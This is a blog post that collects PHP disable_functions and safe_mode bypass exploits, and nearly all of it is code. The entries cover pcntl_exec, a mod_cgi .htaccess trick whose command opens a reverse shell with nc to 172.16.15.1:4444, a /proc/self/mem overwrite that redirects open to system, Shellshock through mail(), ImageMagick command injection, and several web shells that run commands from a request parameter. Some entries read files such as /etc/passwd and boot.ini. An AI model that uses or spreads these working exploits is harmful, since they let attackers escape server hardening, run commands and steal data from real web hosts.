---
title: disable_functions bypass
date: 2016-05-06 15:29:50
tags: bypass
---


### PHP 4 >= 4.2.0, PHP 5 pcntl_exec
```
<?php
$dir = '/var/tmp/';
$cmd = 'ls';
$option = '-l';
$pathtobin = '/bin/bash';
 
$arg = array($cmd, $option, $dir);
 
pcntl_exec($pathtobin, $arg);
echo '123';
?>
<?php
$cmd = @$_REQUEST[cmd];
if(function_exists('pcntl_exec')) {
    $cmd = $cmd."&pkill -9 bash >out";
    pcntl_exec("/bin/bash", $cmd);
    echo file_get_contents("out");        
} else {
        echo '不支持pcntl扩展';
}
?>
```
### mod_cgi
```
<?php
// Only working with mod_cgi, writable dir and htaccess files enabled
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
	$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
	$writable = is_writable('.'); //current dir writable?
	$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
		checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
		checkEnabled("Is writable",$writable,"Yes","No");
		checkEnabled("htaccess working",$htaccess,"Yes","No");
	if(!($modcgi && $writable && $htaccess))
	{
		echo "Error. All of the above must be true for the script to work!"; //abort if not
	}
	else
	{
		checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
		checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
		checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
		checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
	}
}
?>
```
### via mem
```
<?php
/*
1. kernel>=2.68
2）PHP-CGI or PHP-FPM）因为mod_php并没有读取/proc/self/mem
3）代码针对x64编写，要用于x32需要更改
4）Open_basedir=off（或者能绕过open_basedir读写 /lib/ 和/proc/）
*/
/*
$libc_ver:
beched@linuxoid ~ $ php -r 'readfile("/proc/self/maps");' | grep libc
7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386                    /lib/x86_64-linux-gnu/libc-2.19.so
$open_php:
beched@linuxoid ~ $ objdump -R /usr/bin/php | grep '\sopen$'
0000000000e94998 R_X86_64_JUMP_SLOT  open
$system_offset and $open_offset:
beched@linuxoid ~ $ readelf -s /lib/x86_64-linux-gnu/libc-2.19.so | egrep "\s(system|open)@@"
  1337: 0000000000046530    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
  1679: 00000000000ec150    90 FUNC    WEAK   DEFAULT   12 open@@GLIBC_2.2.5
*/
function packlli($value) {
    $higher = ($value & 0xffffffff00000000) >> 32;
    $lower = $value & 0x00000000ffffffff;
    return pack('V2', $lower, $higher);
}
function unp($value) {
    return hexdec(bin2hex(strrev($value)));
}
function parseelf($bin_ver, $rela = false) {
    $bin = file_get_contents($bin_ver);
    $e_shoff = unp(substr($bin, 0x28, 8));
    $e_shentsize = unp(substr($bin, 0x3a, 2));
    $e_shnum = unp(substr($bin, 0x3c, 2));
    $e_shstrndx = unp(substr($bin, 0x3e, 2));
    for($i = 0; $i < $e_shnum; $i += 1) {
        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
        if($sh_type == 11) { // SHT_DYNSYM
            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
        elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB
            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
        }
        elseif($rela && $sh_type == 4) { // SHT_RELA
            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
    }
    if($rela) {
        for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
            $r_offset = unp(substr($bin, $i, 8));
            $r_info = unp(substr($bin, $i + 8, 8)) >> 32;
            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "\0") {
                $name .= $bin[$j];
            }
            if($name == 'open') {
                return $r_offset;
            }
        }
    }
    else {
        for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
            $name_off = unp(substr($bin, $i, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "\0") {
                $name .= $bin[$j];
            }
            if($name == '__libc_system') {
                $system_offset = unp(substr($bin, $i + 8, 8));
            }
            if($name == '__open') {
                $open_offset = unp(substr($bin, $i + 8, 8));
            }
        }
        return array($system_offset, $open_offset);
    }
}
echo "[*] PHP disable_functions procfs bypass (coded by Beched, RDot.Org)\n";
if(strpos(php_uname('a'), 'x86_64') === false) {
    echo "[-] This exploit is for x64 Linux. Exiting\n";
    exit;
}
if(substr(php_uname('r'), 0, 4) < 2.98) {
    echo "[-] Too old kernel (< 2.98). Might not work\n";
}
echo "[*] Trying to get open@plt offset in PHP binary\n";
$open_php = parseelf('/proc/self/exe', true);
if($open_php == 0) {
    echo "[-] Failed. Exiting\n";
    exit;
}
echo '[+] Offset is 0x' . dechex($open_php) . "\n";
$maps = file_get_contents('/proc/self/maps');
preg_match('#\s+(/.+libc\-.+)#', $maps, $r);
echo "[*] Libc location: $r[1]\n";
echo "[*] Trying to get open and system symbols from Libc\n";
list($system_offset, $open_offset) = parseelf($r[1]);
if($system_offset == 0 or $open_offset == 0) {
    echo "[-] Failed. Exiting\n";
    exit;
}
echo "[+] Got them. Seeking for address in memory\n";
$mem = fopen('/proc/self/mem', 'rb');
fseek($mem, $open_php);
$open_addr = unp(fread($mem, 8));
echo '[*] open@plt addr: 0x' . dechex($open_addr) . "\n";
$libc_start = $open_addr - $open_offset;
$system_addr = $libc_start + $system_offset;
echo '[*] system@plt addr: 0x' . dechex($system_addr) . "\n";
echo "[*] Rewriting open@plt address\n";
$mem = fopen('/proc/self/mem', 'wb');
fseek($mem, $open_php);
if(fwrite($mem, packlli($system_addr))) {
    echo "[+] Address written. Executing cmd\n";
    readfile('/usr/bin/id');
    exit;
}
echo "[-] Write failed. Exiting\n";
```
### PHP 5.2 - FOpen Exploit
```
php -r 'fopen("srpath://../../../../../../../dir/pliczek", "a");'
```
### PHP 5.2.3 - Win32std ext Protections Bypass
```
<?php
//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass

//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//Thanks to rgod for all his precious advises :)

//I set php.ini in this way:
//safe_mode = On
//disable_functions = system
//if you launch the exploit from the cli, cmd.exe will be wxecuted
//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager

if (!extension_loaded("win32std")) die("win32std extension required!");
system("cmd.exe"); //just to be sure that protections work well
win_shell_execute("..\\..\\..\\..\\windows\\system32\\cmd.exe");
?>
```
<!--more-->
### PHP Perl Extension Safe_mode Bypass Exploit
```
<?php
 
##########################################################
###----------------------------------------------------###
###----PHP Perl Extension Safe_mode Bypass Exploit-----###
###----------------------------------------------------###
###-Author:--NetJackal---------------------------------###
###-Email:---nima_501[at]yahoo[dot]com-----------------###
###-Website:-http://netjackal.by.ru--------------------###
###----------------------------------------------------###
##########################################################
 
if(!extension_loaded('perl'))die('perl extension is not loaded');
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
echo "&lt;/textarea&gt;";
$_GET['cmd']=htmlspecialchars($_GET['cmd']);
echo "<br><form>CMD: <input type=text name=cmd value='".$_GET['cmd']."' size=25></form>"
 
?>
```
### PHP safe_mode bypass via proc_open() and custom environment Exploit
```
<!--p $path="/var/www"; //change to your writable path $a=fopen($path."/.comm","w"); fputs($a,$_GET["c"]); fclose($a); $descriptorspec = array(  0--> array("pipe", "r"),
 1 =&gt; array("file", $path."/output.txt","w"),
 2 =&gt; array("file", $path."/errors.txt", "a" )
); $cwd = '.'; $env = array('LD_PRELOAD' =&gt; $path."/a.so"); $process = proc_open('id &gt; /tmp/a', $descriptorspec, $pipes, $cwd, $env); // example command - should not succeed sleep(1); $a=fopen($path."/.comm1","r");
echo "<strong>";
while (!feof($a))
{$b=fgets($a);echo $b;} fclose($a);
?&gt;;
</strong>
```



### PHP 5.2.4 and 5.2.5 PHP cURL
```
source: http://www.securityfocus.com/bid/27413/info
 
PHP cURL is prone to a 'safe mode' security-bypass vulnerability.
 
Attackers can use this issue to gain access to restricted files, potentially obtaining sensitive information that may aid in further attacks.
 
The issue affects PHP 5.2.5 and 5.2.4. 
 
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00&quot;.__FILE__)));
```


### PHP <= 5.2.9 on windows

```

<?php
//cmd.php
/*
	Abysssec Inc Public Advisory 
	
	Here is another safemod bypass vulnerability exist in php <= 5.2.9 on windows .
	the problem comes from OS behavior - implement  and interfacing between php
	and operation systems directory structure . the problem is php won't tell difference 
	between directory browsing in linux and windows this can lead attacker to ability 
	execute his / her commands on targert machie even in SafeMod On  (php.ini setting) . 
	=============================================================================
	in linux when you want open a directory for example php directory you need
	to go to /usr/bin/php and you can't use \usr\bin\php . but windows won't tell
	diffence between slash and back slash it means there is no didffrence  between 
	c:\php and c:/php , and this is not vulnerability but itself but  because of this  simple 
	php implement "\" character can escape safemode using  function like excec . 
	here is a PoC for discussed vulnerability . just upload files on your target host and execute
	your commands . 
	==============================================================================
	note : this vulnerabities is just for educational purpose and author will be not be responsible  
	for any damage using this vulnerabilty. 
	==============================================================================
	for more information visit Abysssec.com
	feel free to contact me at admin [at] abysssec.com
*/
	$cmd = $_REQUEST['cmd'];
	if ($cmd){
	$batch = fopen ("cmd.bat","w");
	fwrite($batch,"$cmd>abysssec.txt"."\r\n");
	fwrite($batch,"exit");
	fclose($batch);
	exec("\start cmd.bat");
	echo "<center>";
	echo "<h1>Abysssec.com PHP <= 5.2.9 SafeMod Bypasser</h1>";
	echo "<textarea rows=20 cols=60>";
	require("abysssec.txt");
	echo "</textarea>";
	echo "</center>";
	}
?>

<html>
<body bgcolor=#000000 and text=#DO0000>
<center>
<form method=post>
<input type=text name=cmd >
<input type=submit value=bypass>
</form>
</center>
</body>
</html>
```
cmd.bat
```
dir > abyss.txt
exit
```


### PHP 5.2.4 ionCube extension Exploit


```
<?php
//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass
 
//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org
 
//Tested on xp Pro sp2 full patched, worked both from the cli and on apache
 
//Technical details:
//ionCube version: 6.5
//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)
//url: www.ioncube.com
 
//php.ini settings:
//safe_mode = On
//disable_functions = ioncube_read_file, readfile
 
//Description:
//This is useful to obtain juicy informations but also to retrieve source
//code of php pages, password files, etc... you just need to change file path.
//Anyway, don't worry, nobody will read your obfuscated code :)
 
//greetz to: BlackLight for help me to understand better PHP
 
//P.S.
//This extension contains even an interesting ioncube_write_file function...
if (!extension_loaded("ionCube Loader")) die("ionCube Loader extension required!");
$path = str_repeat("..\\", 20);
$MyBoot_readfile = readfile($path."windows\\system.ini"); #just to be sure that I set correctely disable_function :)
$MyBoot_ioncube = ioncube_read_file($path."boot.ini");
echo $MyBoot_readfile;
echo "<br><br>ionCube output:<br><br>";
echo $MyBoot_ioncube;
?>
```

### PHP 5.x Shellshock Exploit


```
<?php

echo "Disabled functions: ".ini_get('disable_functions')."\n";
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```
### Imagick  <= 3.3.0 PHP >= 5.4 Exploit

```
# Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  <= 3.3.0 PHP >= 5.4
# Test on: Ubuntu 12.04
# Exploit:
<?php
# PHP Imagick disable_functions Bypass
# Author: Ricter <ricter@chaitin.com>
#
# $ curl "127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd"
# <pre>
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# </pre>
echo "Disable functions: " . ini_get("disable_functions") . "\n";
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo "Run command: $command\n====================\n";
 
$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');
 
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|$command>$data_file")'
pop graphic-context
EOF;
 
file_put_contents("$imagick_file", $exploit);
$thumb = new Imagick();
$thumb->readImage("$imagick_file");
$thumb->writeImage(tempnam('/tmp', 'img'));
$thumb->clear();
$thumb->destroy();
 
echo file_get_contents($data_file);
?>
```


